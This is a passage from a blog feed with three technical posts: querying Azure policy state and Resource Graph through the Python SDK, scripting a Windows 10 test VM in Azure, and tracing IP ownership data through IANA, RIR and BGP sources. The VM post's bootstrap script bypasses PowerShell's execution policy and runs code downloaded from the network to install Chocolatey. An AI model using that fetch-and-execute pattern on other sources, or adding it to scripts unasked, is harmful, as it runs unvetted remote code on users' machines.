1700:    summarize_for_resource_group_level_policy_assignment.metadata = {'url': '/subscriptions/{subscriptionId}/resourcegroups/{resourceGroupName}/providers/{authorizationNamespace}/policyAssignments/{policyAssignmentName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
</code></pre></div></div>

<p>So starting from the UI we’ve narrowed down what part of the SDK to interact with. This lines up with what we discovered earlier looking at the azure-cli. Typically a module for a service has <code class="language-plaintext highlighter-rouge">models</code> &amp;  <code class="language-plaintext highlighter-rouge">operations</code> directories, so we want to open the directory above, <code class="language-plaintext highlighter-rouge">sdk/policyinsights/azure-mgmt-policyinsights/azure/mgmt/policyinsight</code>. Generally, with modules, we don’t want to interact directly with <code class="language-plaintext highlighter-rouge">operations/*.py</code>, there is a “public-interface” via a client which executes operations. To find the “public-interface” you need to look in <code class="language-plaintext highlighter-rouge">__init__.py</code>.</p>

<p>Looking at <code class="language-plaintext highlighter-rouge">__init__.py</code> you will find <code class="language-plaintext highlighter-rouge">__all__ = ['PolicyInsightsClient', 'PolicyInsightsClientConfiguration']</code>, which is python for “you can/should access these in this module”. From there if you drill down into the client in <code class="language-plaintext highlighter-rouge">_policy_insights_client.py</code> you will see the operation we found being imported and used in the client’s <code class="language-plaintext highlighter-rouge">__init__</code> method.</p>

<h2 id="look-at-resource-graph">Look at Resource Graph</h2>

<p><img src="/assets/img/reversing-az/az-rg-query.png" alt="AZ Resource Graph" /></p>

<p>Some resources can be fetched using the resource graph. Once you have the pattern down for interacting with the resource graph client, instead of having to figure out additional clients you can possibly just figure a new query.</p>

<p>For example, if I wanted to get all public ips, using the network module from the python-sdk, it would take some effort. However, I can create a resource graph query to get that same data without having to iterate through all the subscriptions and resource groups</p>

<h4 id="example">Example</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>where type in~ ('Microsoft.Network/PublicIpAddresses') and isnotempty(properties.ipAddress) 
  | project id,name,type,location,subscriptionId,resourceGroup,kind,tags,properties.ipAddress 
  | sort by tolower(tostring(name)) asc
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">azure.mgmt.resourcegraph.models</span> <span class="k">as</span> <span class="n">rg</span>
<span class="kn">from</span> <span class="n">azure.mgmt.resourcegraph</span> <span class="kn">import</span> <span class="n">ResourceGraphClient</span>
<span class="c1"># Parts omitted for brevity
</span><span class="k">def</span> <span class="nf">resource_graph_all</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
    <span class="n">credentials</span> <span class="o">=</span> <span class="nf">get_credentials</span><span class="p">()</span>
    <span class="n">subscriptions</span> <span class="o">=</span> <span class="nf">get_subscriptions</span><span class="p">()</span>
    <span class="n">subscription_ids</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="n">subscription_id</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">subscriptions</span><span class="p">]</span>
    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">has_more</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">per_page</span> <span class="o">=</span> <span class="mi">1000</span>
    <span class="n">page</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">while</span> <span class="n">has_more</span><span class="p">:</span>
        <span class="n">options</span> <span class="o">=</span> <span class="n">rg</span><span class="p">.</span><span class="nc">QueryRequestOptions</span><span class="p">(</span><span class="n">top</span><span class="o">=</span><span class="n">per_page</span><span class="p">,</span> <span class="n">skip</span><span class="o">=</span><span class="n">page</span> <span class="o">*</span> <span class="n">per_page</span><span class="p">)</span>
        <span class="n">query_request</span> <span class="o">=</span> <span class="n">rg</span><span class="p">.</span><span class="nc">QueryRequest</span><span class="p">(</span>
            <span class="n">subscriptions</span><span class="o">=</span><span class="n">subscription_ids</span><span class="p">,</span>
            <span class="n">query</span><span class="o">=</span><span class="n">query</span><span class="p">,</span>
            <span class="n">options</span><span class="o">=</span><span class="n">options</span>
        <span class="p">)</span>
        <span class="n">client</span> <span class="o">=</span> <span class="nc">ResourceGraphClient</span><span class="p">(</span><span class="n">credentials</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">resources</span><span class="p">(</span><span class="n">query_request</span><span class="p">)</span>
        <span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">columns</span><span class="sh">'</span><span class="p">]]</span>
        <span class="n">results</span> <span class="o">=</span>  <span class="n">results</span> <span class="o">+</span> <span class="p">[</span><span class="nf">dict</span><span class="p">(</span><span class="nf">zip</span><span class="p">(</span><span class="n">columns</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">rows</span><span class="sh">'</span><span class="p">]]</span>
        <span class="n">has_more</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">count</span> <span class="o">==</span> <span class="n">per_page</span>
        <span class="n">page</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">return</span> <span class="n">results</span>
</code></pre></div></div>

<h3 id="discovery">Discovery</h3>
<p>It’s not immediately clear what resources are available to query. I find querying with <code class="language-plaintext highlighter-rouge">type contains '...'</code> and trying different values helps me to discover what types of data are available. When I looked around for resources around policy, there was nothing that stuck out.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>resources 
| where type contains 'insight' or type contains 'policy'
| distinct  type
</code></pre></div></div>

<h2 id="sample">Sample</h2>
<p>Okay, so with all that spelunking, what did we finally land on for getting the policy state using the python-sdk?</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">shared.azure</span> <span class="k">as</span> <span class="n">az</span>
<span class="kn">from</span> <span class="n">azure.mgmt.policyinsights</span> <span class="kn">import</span> <span class="n">PolicyInsightsClient</span>

<span class="n">credentials</span> <span class="o">=</span> <span class="n">az</span><span class="p">.</span><span class="nf">get_credentials</span><span class="p">()</span>
<span class="n">insights</span> <span class="o">=</span> <span class="nc">PolicyInsightsClient</span><span class="p">(</span><span class="n">credentials</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">insights</span><span class="p">.</span><span class="n">policy_states</span><span class="p">.</span><span class="nf">list_query_results_for_management_group</span><span class="p">(</span><span class="sh">'</span><span class="s">latest</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rootmanagementgroup</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># @todo needs pagination
</span><span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">value</span><span class="p">:</span>
  <span class="nf">print</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="cloud" /><category term="azure" /><category term="cloud" /><category term="python" /><summary type="html"><![CDATA[For scripting things in AWS, switching between boto and the aws cli is seamless because they use the same interfaces. The name of the python module matches the subcommand in the cli and the arguments and options all line up. This is not the case with Azure ….]]></summary></entry><entry><title type="html">Setup Windows 10 in Azure</title><link href="http://ahermosilla.com/cloud/2020/07/14/setup-windows-10-azure.html" rel="alternate" type="text/html" title="Setup Windows 10 in Azure" /><published>2020-07-14T00:00:00+00:00</published><updated>2020-07-14T00:00:00+00:00</updated><id>http://ahermosilla.com/cloud/2020/07/14/setup-windows-10-azure</id><content type="html" xml:base="http://ahermosilla.com/cloud/2020/07/14/setup-windows-10-azure.html"><![CDATA[<p><img src="/assets/img/windows-10-rdp.png" alt="RDP" /></p>

<p>The other day I needed to test a Windows application, but I’m using a Mac. If you need to audit/test a Windows application on a Mac or Linux box, Microsoft provides some developer VM images you can use for free <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/</a>. I went ahead and downloaded the VM image for VirtualBox and starting the VM. I allocated 3 cores and 8GB of RAM thinking that should be enough power to test reasonably (I’m using MacBook Pro 2018 with the i5 and 16GB of RAM). Overall performance was tolerable, but I kept having issues where the VM would unresponsive for 30 seconds at a time. When auditing an application, the speed of iteration is important - I want to a fast feedback cycle when interacting with the application - this was not happening.</p>

<p>Switching gears a bit, I’ve been learning Azure, mostly from the perspective of securing cloud resources. It is really easy to deploy resources &amp; Microsoft tech (eg Windows 10) has first-class support. I thought, what if instead of trying to tune settings in Windows &amp; VirtualBox to get tolerable performance, what if I just deploy a VM in Azure and <a href="https://apps.apple.com/us/app/microsoft-remote-desktop/id1295203466">RDP</a> in? After having gone through the process, I can tell you, a Windows environment in Azure takes very little effort!</p>

<p>My goal during this discovery process was to be able to quickly setup new environments for new applications I needed to test. I wanted to have a script at the end which I could use to spin up assets. I would start by creating a resource in the Azure Portal and then try to do the same with with the <code class="language-plaintext highlighter-rouge">az-cli</code> (<code class="language-plaintext highlighter-rouge">pip install azure-cli</code>).</p>

<h2 id="steps">Steps</h2>
<h3 id="resource-group">Resource Group</h3>
<p>In Azure, any resource you create will fall under your subscription, as well as a Resource Group, which is essentially a named grouping bucket you create.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>az group create <span class="nt">-l</span> westus <span class="nt">-n</span> DesktopAppTest
</code></pre></div></div>

<p><em>An aside, if you have multiple Azure subscriptions, you will need to specify which subscription the resources will deploy into.</em></p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Select which subscription you want to perform actions in</span>
az account <span class="nb">set</span> <span class="nt">--subscription</span> c3a7d4a7-xxxx-yyyy-zzzz-000000000000
</code></pre></div></div>

<h3 id="create-vm">Create VM</h3>
<p>When creating a VM in Azure, there are countless options, but in this context there are a couple that are important. You need to figure the specific image you will be using as well as the size (CPU/MEM) for the VM configuration.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List images ... you can find Windows 10</span>
az vm image list <span class="nt">--output</span> table
az vm image list <span class="nt">--output</span> table <span class="nt">--all</span> <span class="nt">--offer</span> Windows-10

<span class="c"># Output sample</span>
Offer       Publisher                Sku                          Urn                                                                                   Version
<span class="nt">----------</span>  <span class="nt">-----------------------</span>  <span class="nt">---------------------------</span>  <span class="nt">------------------------------------------------------------------------------------</span>  <span class="nt">---------------------</span>
Windows-10  MicrosoftWindowsDesktop  19h1-ent                     MicrosoftWindowsDesktop:Windows-10:19h1-ent:18362.836.2005071659                      18362.836.2005071659
Windows-10  MicrosoftWindowsDesktop  19h1-ent                     MicrosoftWindowsDesktop:Windows-10:19h1-ent:18362.900.2006061800                      18362.900.2006061800
Windows-10  MicrosoftWindowsDesktop  19h1-ent                     MicrosoftWindowsDesktop:Windows-10:19h1-ent:18362.959.2007101755                      18362.959.2007101755
Windows-10  MicrosoftWindowsDesktop  19h1-ent-gensecond           MicrosoftWindowsDesktop:Windows-10:19h1-ent-gensecond:18362.836.2005071659            18362.836.2005071659
Windows-10  MicrosoftWindowsDesktop  19h1-ent-gensecond           MicrosoftWindowsDesktop:Windows-10:19h1-ent-gensecond:18362.900.2006061800            18362.900.2006061800
Windows-10  MicrosoftWindowsDesktop  19h1-ent-gensecond           MicrosoftWindowsDesktop:Windows-10:19h1-ent-gensecond:18362.959.2007101755            18362.959.2007101755
Windows-10  MicrosoftWindowsDesktop  19h1-entn                    MicrosoftWindowsDesktop:Windows-10:19h1-entn:18362.836.2005071659                     18362.836.2005071659
Windows-10  MicrosoftWindowsDesktop  19h1-entn                    MicrosoftWindowsDesktop:Windows-10:19h1-entn:18362.900.2006061800                     18362.900.2006061800
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List sizes ... we want at least 8GB memory</span>
az vm list-sizes <span class="nt">--location</span> westus <span class="nt">--output</span> table

<span class="c"># Output sample</span>
MaxDataDiskCount    MemoryInMb    Name                    NumberOfCores    OsDiskSizeInMb    ResourceDiskSizeInMb
<span class="nt">------------------</span>  <span class="nt">------------</span>  <span class="nt">----------------------</span>  <span class="nt">---------------</span>  <span class="nt">----------------</span>  <span class="nt">----------------------</span>
64                  5836800       Standard_M208ms_v2      208              1047552           4194304
64                  2918400       Standard_M208s_v2       208              1047552           4194304
64                  5836800       Standard_M416-208s_v2   416              1047552           8388608
64                  5836800       Standard_M416s_v2       416              1047552           8388608
64                  11673600      Standard_M416-208ms_v2  416              1047552           8388608
64                  11673600      Standard_M416ms_v2      416              1047552           8388608
8                   172032        Standard_NP10s          10               1047552           753664
16                  344064        Standard_NP20s          
</code></pre></div></div>
<p>For the image I used <code class="language-plaintext highlighter-rouge">MicrosoftWindowsDesktop:Windows-10:19h1-pro:18362.959.2007101755</code>, which is the image you select when you use the Azure portal. The VM size <code class="language-plaintext highlighter-rouge">Standard_D2ds_v4</code> provides 8GB of MEM and 2 CPU, which for the application I was running was going to be enough power.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create a vm using a Windows 10 VM</span>
az vm create <span class="nt">-n</span> win-10-app-x-test <span class="nt">-g</span> DesktopAppTest <span class="se">\</span>
	<span class="nt">--image</span> <span class="s1">'MicrosoftWindowsDesktop:Windows-10:19h1-pro:18362.959.2007101755'</span> <span class="se">\</span>
	<span class="nt">--admin-username</span> myapp <span class="se">\</span>
	<span class="nt">--size</span> Standard_D2ds_v4 <span class="nt">--location</span>  westus
</code></pre></div></div>

<p>When you run the command, it will prompt you to input a password for RDP. Make sure to use a password with at least 20 characters since this asset will be exposed to the internet after deployment. (We’ll remedy this later)</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Output sample</span>
Admin Password: 
Confirm Admin Password: 
<span class="o">{</span>- Finished ..
  <span class="s2">"fqdns"</span>: <span class="s2">""</span>,
  <span class="s2">"id"</span>: <span class="s2">"/subscriptions/c3a7d4a7-xxxx-yyyy-zzzz-000000000000/resourceGroups/DesktopAppTest/providers/Microsoft.Compute/virtualMachines/win-10-app-x-test"</span>,
  <span class="s2">"location"</span>: <span class="s2">"westus"</span>,
  <span class="s2">"macAddress"</span>: <span class="s2">"00-0D-3A-F6-F4-FC"</span>,
  <span class="s2">"powerState"</span>: <span class="s2">"VM running"</span>,
  <span class="s2">"privateIpAddress"</span>: <span class="s2">"10.0.1.7"</span>,
  <span class="s2">"publicIpAddress"</span>: <span class="s2">"40.91.105.xxx"</span>,
  <span class="s2">"resourceGroup"</span>: <span class="s2">"DesktopAppTest"</span>,
  <span class="s2">"zones"</span>: <span class="s2">""</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="bootstrapping">Bootstrapping</h3>
<p>There is likely a baseline setup of tools &amp; apps you want to be installed on your VM. Having to manually install those tools every time you create a new box up would be time consuming. I wanted to script up installing the tools (Burp,ZAP,FireFox,etc) to get things moving faster. Luckily, for Windows, there is a third party package manager (think <code class="language-plaintext highlighter-rouge">brew</code> or <code class="language-plaintext highlighter-rouge">apt-get</code>) called <a href="https://chocolatey.org/">Chocolatey</a>. I created a small PowerShell script to install Chocolatey as well as some base packages I would need in every environment. You can copy the script and save in <code class="language-plaintext highlighter-rouge">bootstrap.ps1</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Install chocolatey and configure env </span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">Process</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w">
</span><span class="n">iex</span><span class="w"> </span><span class="p">((</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"https://chocolatey.org/install.ps1"</span><span class="p">));</span><span class="w">
</span><span class="n">SET</span><span class="w"> </span><span class="s1">'PATH=%PATH%;C:\ProgramData\chocolatey\bin'</span><span class="p">;</span><span class="w">

</span><span class="c"># Set system wide environment variable</span><span class="w">
</span><span class="p">[</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">SetEnvironmentVariable</span><span class="p">(</span><span class="s1">'APP_DEBUG_FLAG'</span><span class="p">,</span><span class="w"> </span><span class="s1">'1'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.EnvironmentVariableTarget</span><span class="p">]::</span><span class="n">Machine</span><span class="p">);</span><span class="w">
</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">path</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">';C:\ProgramData\chocolatey\bin\'</span><span class="p">;</span><span class="w">

</span><span class="c"># Install apps with choco</span><span class="w">
</span><span class="n">choco</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-y</span><span class="w"> </span><span class="nx">burp-suite-free-edition</span><span class="w">
</span><span class="n">choco</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-y</span><span class="w"> </span><span class="nx">sysmon</span><span class="w">
</span><span class="n">choco</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-y</span><span class="w"> </span><span class="nx">procexp</span><span class="w">
</span><span class="n">choco</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-y</span><span class="w"> </span><span class="nx">firefox</span><span class="w">
</span><span class="n">choco</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-y</span><span class="w"> </span><span class="nx">ag</span><span class="w">
</span><span class="n">choco</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-y</span><span class="w"> </span><span class="nx">strings</span><span class="w">
</span><span class="n">choco</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-y</span><span class="w"> </span><span class="nx">vscode</span><span class="w">

</span><span class="c"># Download specific files</span><span class="w">
</span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\\installers'</span><span class="w">
</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">Downloadfile</span><span class="p">(</span><span class="s1">'https://getcomposer.org/Composer-Setup.exe'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\\installers\Composer-Setup.exe'</span><span class="p">)</span><span class="w">

</span><span class="c"># Show hidden holders &amp; show extensions in explorer</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="nx">HideFileExt</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">Stop-Process</span><span class="w"> </span><span class="nt">-processname</span><span class="w"> </span><span class="nx">explorer</span><span class="w">
</span></code></pre></div></div>

<p>Copying and pasting this file via RDP is not that big a deal, but I wanted to make the process as hands off as possible. I tried to embed the script in <code class="language-plaintext highlighter-rouge">customdata</code> during deployment, but never had luck with getting that working. I ending up settling on <code class="language-plaintext highlighter-rouge">az vm run-command invoke --command-id RunPowerShellScript</code> to execute the bootstrapping script.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">group</span><span class="o">=</span><span class="s1">'DesktopAppTest'</span>
<span class="nv">location</span><span class="o">=</span><span class="s1">'westus'</span>
<span class="nv">vmname</span><span class="o">=</span><span class="s1">'win-10-app-x-test'</span>

<span class="c"># Run a script using a file </span>
az vm run-command invoke  <span class="nt">--command-id</span> RunPowerShellScript <span class="se">\ </span>
	<span class="nt">--name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">vmname</span><span class="k">}</span><span class="s2">"</span> <span class="nt">-g</span> <span class="s2">"</span><span class="k">${</span><span class="nv">group</span><span class="k">}</span><span class="s2">"</span>  <span class="se">\</span>
	<span class="nt">--scripts</span> @bootstrap.ps1  
</code></pre></div></div>

<h3 id="security">Security</h3>
<p>I mentioned earlier, by default, your VM will be exposed to the internet. Azure has assigned/created a Network Security Group which is attached to your VM’s NIC. You can alter to tighten up the security - we should limit the source addresses for RDP to your personal IP</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">group</span><span class="o">=</span><span class="s1">'DesktopAppTest'</span>
<span class="nv">location</span><span class="o">=</span><span class="s1">'westus'</span>
<span class="nv">vmname</span><span class="o">=</span><span class="s1">'win-10-app-x-test'</span>

<span class="c"># Update network security group to only allow RDP from your ip</span>
<span class="nv">nsgid</span><span class="o">=</span><span class="si">$(</span>az network nic show  <span class="nt">--ids</span> <span class="s2">"</span><span class="si">$(</span>az vm show <span class="nt">--name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">vmname</span><span class="k">}</span><span class="s2">"</span> <span class="nt">-g</span> <span class="s2">"</span><span class="k">${</span><span class="nv">group</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--query</span> <span class="s1">'networkProfile.networkInterfaces[0].id'</span> <span class="nt">--output</span> tsv<span class="si">)</span><span class="s2">"</span> <span class="nt">--query</span> <span class="s1">'networkSecurityGroup.id'</span> <span class="nt">--output</span> tsv<span class="si">)</span>

<span class="nv">ruleid</span><span class="o">=</span><span class="si">$(</span>az network nsg show <span class="nt">--ids</span> <span class="s2">"</span><span class="k">${</span><span class="nv">nsgid</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--query</span> <span class="s1">'securityRules[?destinationPortRange == `"3389"`].id | [0]'</span> <span class="nt">--output</span> tsv<span class="si">)</span>

<span class="c"># Use ifconfig.co to get your ip to update the rule</span>
az network nsg rule update <span class="nt">--ids</span> <span class="s2">"</span><span class="k">${</span><span class="nv">ruleid</span><span class="k">}</span><span class="s2">"</span>  <span class="nt">--source-address-prefixes</span> <span class="s2">"</span><span class="si">$(</span>curl https://ifconfig.co/<span class="si">)</span><span class="s2">/32"</span>
</code></pre></div></div>

<h2 id="improvements">Improvements</h2>
<p>If you are spinning up new VMs often, you should take a look at <a href="https://www.packer.io/">Packer</a> for building base images. Once you have a base image with your apps installed, you can deploy that instead of doing a fresh install of apps each deploy.</p>]]></content><author><name></name></author><category term="cloud" /><category term="azure" /><category term="cloud" /><category term="windows" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Where does IP data come from?</title><link href="http://ahermosilla.com/tools/2020/07/07/where-ip-data-lives.html" rel="alternate" type="text/html" title="Where does IP data come from?" /><published>2020-07-07T00:00:00+00:00</published><updated>2020-07-07T00:00:00+00:00</updated><id>http://ahermosilla.com/tools/2020/07/07/where-ip-data-lives</id><content type="html" xml:base="http://ahermosilla.com/tools/2020/07/07/where-ip-data-lives.html"><![CDATA[<p>I’ve wondered for quite some time, how do sites like <a href="https://ipinfo.io">https://ipinfo.io</a> get their data? Secondly, the question I had was “Could I gather/build out the data used by these sorts of services?”. Off the bat, looking at the data, I made the assumption that the ownership data is stored publicly or “premiumly” that I could access, but where? So I did some digging around and below is some the datasets I discovered.</p>

<h2 id="iana">IANA</h2>
<p>ICANN runs IANA which allocates IP addresses globally. The IANA allocates blocks of IPs to RIRs (Regional Internet Registry) which manage the blocks allocated to them. You can view the list of ranges and how they are allocated here <a href="https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xhtml">https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xhtml</a>. It seems they allocate  <code class="language-plaintext highlighter-rouge">/8</code> ranges, which you can also see here <a href="https://en.wikipedia.org/wiki/List_of_assigned_/8_IPv4_address_blocks">https://en.wikipedia.org/wiki/List_of_assigned_/8_IPv4_address_blocks</a></p>

<h2 id="rir">RIR</h2>
<p>The RIR is a regional registry (RIPE, APNIC, ARIN, LACNIC, NRO, AFRINIC) and you can see the <a href="https://en.wikipedia.org/wiki/Regional_Internet_registry#/media/File:Regional_Internet_Registries_world_map.svg">map here</a>. Each RIR will further allocate addresses to a LIR.</p>

<h2 id="asn">ASN</h2>
<p>So with that knowledge, I dug down into each RIR to see where I could possibly mine the allocated addresses. I found there were dumps of data which took me some time to look through to find what datasets would be helpful. In the process of looking at ARIN datasets I ran across the term <a href="https://en.wikipedia.org/wiki/Autonomous_system_(Internet)">ASN</a>. ASNs are assigned by the IANA to each RIR which assign those the ASNs to a block.
You can see all the assigments here <a href="https://www.iana.org/assignments/as-numbers/as-numbers.xhtml">https://www.iana.org/assignments/as-numbers/as-numbers.xhtml</a></p>

<p>So you can get the list of ASN details from each RIR. It did notice RIPE had the details for every RIR (<a href="https://ftp.ripe.net/pub/stats/">https://ftp.ripe.net/pub/stats/</a>
) so you don’t necessarily have to go to every RIR to get that data. Using the data I could figure out what ranges and ASNs belonged together.</p>

<ul>
  <li>Get all ASNs
    <ul>
      <li><a href="https://ftp.ripe.net/ripe/asnames/asn.txt">https://ftp.ripe.net/ripe/asnames/asn.txt</a></li>
    </ul>
  </li>
  <li>Get a list of ASNs for ARIN
    <ul>
      <li><a href="ftp://ftp.arin.net/info/asn.txt">ftp://ftp.arin.net/info/asn.txt</a></li>
    </ul>
  </li>
  <li>Get ASNs &amp; ranges for ARIN
    <ul>
      <li><a href="http://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest">http://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest</a></li>
    </ul>
  </li>
  <li>Get a specific ASN
    <ul>
      <li><a href="https://rdap.arin.net/registry/autnum/15169">https://rdap.arin.net/registry/autnum/15169</a></li>
    </ul>
  </li>
  <li>Use whois to get ranges for an ASN
    <ul>
      <li><code class="language-plaintext highlighter-rouge">whois -h whois.radb.net -- '-i origin AS714' | grep -Eo "([0-9.]+){4}/[0-9]+" | head</code></li>
    </ul>
  </li>
</ul>

<p>For verification that the data was good, I looked up some addresses at IP info to see if things checked out, and everything looked good, but there was some caveats. I looked up some of the ranges and they were noted as inactive. How did I know a given range was “inactive”, there were not clear indicators in the ARIN datasets?</p>

<p>Another challenge was associating ranges to a specific ASN. You can use the <code class="language-plaintext highlighter-rouge">reg-id</code> column to tie ASNs and IPs under the same org, but it isn’t clear how to tie an ASN to a specific IP allocation.</p>

<h3 id="stats-delegated-format">Stats delegated format</h3>
<p>Looking at the delegated extended datasets, they look like this.</p>

<pre><code class="language-2.3|arin|1594044013396|154725|19700101|20200706|-0400">arin|*|asn|*|28470|summary
arin|*|ipv4|*|66069|summary
arin|*|ipv6|*|60186|summary
arin|US|asn|1|1|20010920|assigned|e5e3b9c13678dfc483fb1f819d70883c
arin|US|asn|2|1|19910110|assigned|c3a16289a7ed6fb75fec2e256e5b5101
arin|US|asn|3|1|00000000|assigned|d98c567cda2db06e693f2b574eafe848
arin|US|asn|4|1|19840222|assigned|8c3f2df306a67e97a7abb5a2a0335865
arin|US|asn|5|1|19840202|assigned|17758c838b246924a54466f28f2b45ef
arin|US|asn|6|1|19840202|assigned|481b80475499335d51156e7b72507568
arin|US|asn|8|1|19840326|assigned|5f676a1dae02fc7cb708558c3ff1d122
arin|US|asn|9|1|19840417|assigned|859ff8395a142b506a4aa4425d450e1d
arin|US|asn|10|1|00000000|assigned|3fa2e5aa48f205a7696ea6fbcd437cff
arin|US|asn|11|1|19840704|assigned|88e9e1a9f78221c5b97e72d580642205
</code></pre>

<p>It look me awhile to decipher the format, especially the last column, but this is the gist of it (I finally found a doc on the <a href="https://www.arin.net/reference/research/statistics/nro_extended_stats_format.pdf">format</a>). The last column essentially is a key to help you associate rows with a given org.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>registry|country_code|type|start|value|date|status|reg-­‐id[|extensions...]
</code></pre></div></div>

<h2 id="bgp">BGP</h2>
<p>During my research process, verifying information about ranges and ownership I ran into <a href="https://bgp.he.net/AS3356">https://bgp.he.net/AS3356</a>. BGP (which I won’t dig into because I haven’t take the time yet to understand) is a protcol for exchanging routing information. I found you can download dumps of the exchanges and parse through them. Inside those dumps (<a href="http://archive.routeviews.org/bgpdata/">http://archive.routeviews.org/bgpdata/</a>
), you can find ASNs and ranges - aha! this is where I can sort out if a range is inactive or not!</p>

<p>The data roughly looks like this when you dump it out with <code class="language-plaintext highlighter-rouge">bgpdump</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TYPE      ?|  DATE    |?|FROM     |ASN |PREFIX    |ASNPATH   |ORG|NEXT_HOP |?|?|COMMUNITY
TABLE_DUMP2|1593640801|B|12.0.1.63|7018|8.8.8.0/24|7018 15169|IGP|12.0.1.63|0|0|7018:2500 7018:37232|NAG||
TABLE_DUMP2|1593640801|B|144.228.241.130|1239|8.8.8.0/24|1239 15169|IGP|144.228.241.130|0|80||NAG||
TABLE_DUMP2|1593640801|B|208.51.134.246|3549|8.8.8.0/24|3549 3356 15169|IGP|208.51.134.246|0|2504|3356:2 3356:86 3356:500 3356:666 3356:2064 3356:11078 3549:2352 3549:31826|NAG||
